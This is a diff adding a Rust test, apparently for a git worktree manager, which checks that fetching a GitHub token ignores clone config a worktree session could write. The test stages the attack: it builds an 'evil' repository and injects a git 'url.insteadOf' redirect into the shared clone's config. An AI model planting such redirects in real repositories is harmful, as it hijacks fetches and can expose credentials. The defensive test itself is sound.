+}
+
+#[tokio::test]
+async fn the_token_fetch_reads_no_config_a_worktree_can_write() {
+    const TOKEN: &str = "ghp_madeUpToken1234567890abcdefABCDEF";
+    let secrets = Arc::new(MemorySecrets::default());
+    secrets.set("github:rawphp", TOKEN).unwrap();
+    let setup = Setup::with_secrets(secrets);
+    let remote = setup.project(&[("README.md", "real\n")]);
+    setup.factory_on(remote.project, "rawphp");
+    setup.create(&remote, "main", "first").await;
+
+    // What a session in a worktree could write into the shared clone's config: another repo,
+    // holding other content on `main`, in place of the project's.
+    let other = setup.remotes.path().join("other");
+    std::fs::create_dir_all(&other).unwrap();
+    git(&other, &["init", "-q", "--bare", "other.git"]);
+    git(&other, &["clone", "-q", "other.git", "src"]);
+    std::fs::write(other.join("src/README.md"), "evil\n").unwrap();
+    git(&other.join("src"), &["add", "-A"]);
+    git(&other.join("src"), &["commit", "-q", "-m", "evil"]);
+    git(
+        &other.join("src"),
+        &["push", "-q", "origin", "HEAD:refs/heads/main"],
+    );
+    let key = format!("url.{}.insteadOf", other.join("other.git").display());
+    git(
+        &setup.clone_of(remote.project),
+        &["config", &key, remote.bare.to_str().unwrap()],
+    );
+    remote.push("main", &[("README.md", "real again\n")]);
+
+    let id = setup.create(&remote, "main", "second").await;
+
+    let worktree = setup.workspaces.worktree(id).await.unwrap();
+    assert_eq!(
+        std::fs::read_to_string(worktree.join("README.md")).unwrap(),
+        "real again\n"
+    );
 }
